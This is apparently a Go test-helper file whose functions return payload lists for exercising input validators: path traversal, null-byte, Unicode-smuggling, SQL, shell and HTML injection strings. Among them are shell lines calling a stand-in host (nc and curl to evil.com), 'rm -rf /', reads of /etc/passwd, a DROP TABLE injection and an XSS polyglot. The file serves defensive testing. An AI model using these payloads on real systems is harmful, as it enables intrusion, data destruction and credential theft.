package testutil

import "strings"

// inputcorpus.go provides shared attack-shaped input corpora that
// any test can run a validator against without reinventing the
// payload list. Keeping the corpora central means:
//
//   - new attack variants get added in one place and immediately
//     improve coverage across every test that consumes them;
//   - tests don't drift away from each other when one engineer
//     adds "..%2F" handling and another only checks "../";
//   - the threat model that motivated each entry stays documented
//     next to the payload, instead of being silent test data.
//
// Every exported corpus function returns a fresh slice — callers
// can freely append / shuffle / sub-select without affecting
// other tests.
//
// All control characters and BOM-shaped codepoints are written as
// explicit \x00 / \ufeff escapes — literal U+0000 (NUL) and
// U+FEFF (BOM) are rejected by the Go compiler in source, and the
// escape form is audit-friendly (a reviewer sees the exact codepoint
// without copying bytes into a hex editor).

// PathTraversalSamples returns sample inputs that try to escape a
// chrooted / sandboxed directory. Every handler that takes a file
// path / key / segment from user input MUST reject these.
func PathTraversalSamples() []string {
	return []string{
		"../",
		"../../",
		"../../../etc/passwd",
		"./../",
		"foo/../../bar",
		"foo/../bar",
		`..` + "\\",
		`..\..\`,
		`..\..\..\windows\system32\config\sam`,
		`foo\..\..\bar`,
		"foo/..\\bar",
		"..\\..//etc/passwd",
		"..%2F",
		"..%2f",
		"%2e%2e%2f",
		"%2e%2e/",
		"..%252F",
		"%252e%252e%252f",
		"..\xc0\xafetc",
		"/etc/passwd",
		`\windows\system32`,
		"safe.txt\x00../../../etc/passwd",
		"..",
		"....",
		"....//",
		"",
		" ",
	}
}

// NullByteSamples returns inputs containing embedded null bytes —
// the canonical truncation-attack vector against any consumer that
// passes user input to a C library, a syscall, or a non-Go process.
func NullByteSamples() []string {
	return []string{
		"\x00",
		"a\x00",
		"\x00b",
		"a\x00b",
		"safe_prefix\x00../../etc/passwd",
		"name\x00.txt",
		"\x00\x00\x00",
	}
}

// ZeroWidthSamples returns inputs containing zero-width or
// directional-override Unicode codepoints. These are the
// homoglyph / Trojan Source class — strings that look identical
// to a human but compare differently to a machine.
// CVE-2021-42574 ("Trojan Source") is the famous example.
func ZeroWidthSamples() []string {
	return []string{
		"\u200b", // ZERO WIDTH SPACE alone
		"\u200c", // ZERO WIDTH NON-JOINER
		"\u200d", // ZERO WIDTH JOINER
		"hidden\u200bsuffix",
		"adm\u200bin",
		"\u202e", // RIGHT-TO-LEFT OVERRIDE
		"\u202d", // LEFT-TO-RIGHT OVERRIDE
		"safe\u202eevil",
		"\u2060",           // WORD JOINER
		"adm\u00adin",      // SOFT HYPHEN
		"safe\ufeffsuffix", // BOM mid-string (smuggling)
	}
}

// ZeroWidthCodepoints returns the rune set ZeroWidthSamples relies on.
func ZeroWidthCodepoints() []rune {
	return []rune{
		'\u200b', '\u200c', '\u200d',
		'\u2060', '\u202e', '\u202d',
		'\u00ad', '\ufeff',
	}
}

// OversizeString returns a deterministic string of exactly n bytes.
// Negative n returns empty. n is clamped at 64 MiB to prevent a test
// authoring mistake from OOMing the test process.
func OversizeString(n int) string {
	const cap = 64 << 20
	if n <= 0 {
		return ""
	}
	if n > cap {
		n = cap
	}
	return strings.Repeat("x", n)
}

// OversizeBytes is OversizeString as []byte.
func OversizeBytes(n int) []byte {
	return []byte(OversizeString(n))
}

// SQLInjectionSamples returns classic SQL injection payloads.
func SQLInjectionSamples() []string {
	return []string{
		"' OR '1'='1",
		"\" OR \"1\"=\"1",
		"1' OR '1'='1' --",
		"admin'--",
		"admin' #",
		"' OR 1=1 --",
		"'; DROP TABLE users; --",
		"' UNION SELECT NULL--",
		"' UNION SELECT password FROM users--",
		"1; SELECT pg_sleep(10); --",
		"0x27",
		"/**/",
		"--",
	}
}

// ShellInjectionSamples returns payloads that break out of an
// unquoted shell argument.
func ShellInjectionSamples() []string {
	return []string{
		"; ls",
		"& whoami",
		"&& cat /etc/passwd",
		"|| rm -rf /",
		"| nc evil.com 4444",
		"`whoami`",
		"$(whoami)",
		"$(curl evil.com)",
		"file.txt; rm -rf /",
		"file.txt && cat /etc/passwd",
		"file.txt\nls /etc",
		"file.txt\rls /etc",
		`\;ls`,
		"*",
		"/tmp/*",
	}
}

// HTMLInjectionSamples returns payloads useful for testing fields
// whose value lands in HTML output. React escapes by default; these
// cover dangerouslySetInnerHTML, href/src, inline event handlers.
func HTMLInjectionSamples() []string {
	return []string{
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg/onload=alert(1)>",
		"javascript:alert(1)",
		"data:text/html,<script>alert(1)</script>",
		"\"><script>alert(1)</script>",
		"' onmouseover='alert(1)",
		"<iframe src='javascript:alert(1)'></iframe>",
		"<a href='javascript:alert(1)'>x</a>",
		// Classic XSS polyglot — works in HTML attribute AND script
		// context. Backtick + asterisk juggling defeats most naive
		// sanitisers; kept on its own line for legibility.
		"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
	}
}

// UnicodeHomoglyphSamples returns strings that LOOK like admin/root
// but use lookalike Unicode codepoints. Useful for testing username
// validators that should reject or NFKC-fold before comparison.
func UnicodeHomoglyphSamples() []string {
	return []string{
		"\u0430dmin",     // Cyrillic 'а' + "dmin"
		"\u0440oot",      // Cyrillic 'р' + "oot"
		"syst\u0435m",    // Cyrillic 'е' inside "system"
		"\u03bfwner",     // Greek omicron + "wner"
		"\uff41dmin",     // Full-width 'a' + "dmin"
		"\U0001D44Edmin", // Math italic 'a' + "dmin"
		"r\u0430dmin",    // mixed-script "radmin"
	}
}

// AllUntrustedInputSamples returns every entry from every corpus
// concatenated. Use sparingly — most validators only need ONE
// category.
func AllUntrustedInputSamples() []string {
	var out []string
	out = append(out, PathTraversalSamples()...)
	out = append(out, NullByteSamples()...)
	out = append(out, ZeroWidthSamples()...)
	out = append(out, SQLInjectionSamples()...)
	out = append(out, ShellInjectionSamples()...)
	out = append(out, HTMLInjectionSamples()...)
	out = append(out, UnicodeHomoglyphSamples()...)
	return out
}
